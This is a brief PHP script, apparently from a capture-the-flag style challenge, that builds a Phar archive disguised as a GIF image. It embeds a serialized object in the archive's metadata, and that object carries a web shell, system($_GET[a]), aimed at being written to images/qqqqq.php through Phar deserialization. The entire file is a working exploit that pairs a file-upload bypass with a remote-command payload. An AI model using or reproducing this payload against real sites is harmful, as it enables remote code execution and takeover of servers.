<?php

class User
{
    public $username;
    function __construct($username, $directory=".") {
        $this->username = $username;
    }
    function __toString()
    {
        return htmlentities($this->username);
    }
}

class Meme
{
    public $title = "qq";
    public $author;
    public $filename = "images/qqqqq.php";
    private $content = "<?php system(\$_GET[a]);?>";

    function __construct() {
        $this->author = new User('haha');
    }
}

$p = new Phar('qq.phar'); // need to mv qq.phar qq.gif
$p->startBuffering();
$p->setStub('GIF89a<?php __HALT_COMPILER(); >');
$qq = new Meme();
$p->setMetadata($qq);
$p->addFromString('qq.txt', 'qq');
$p->stopBuffering();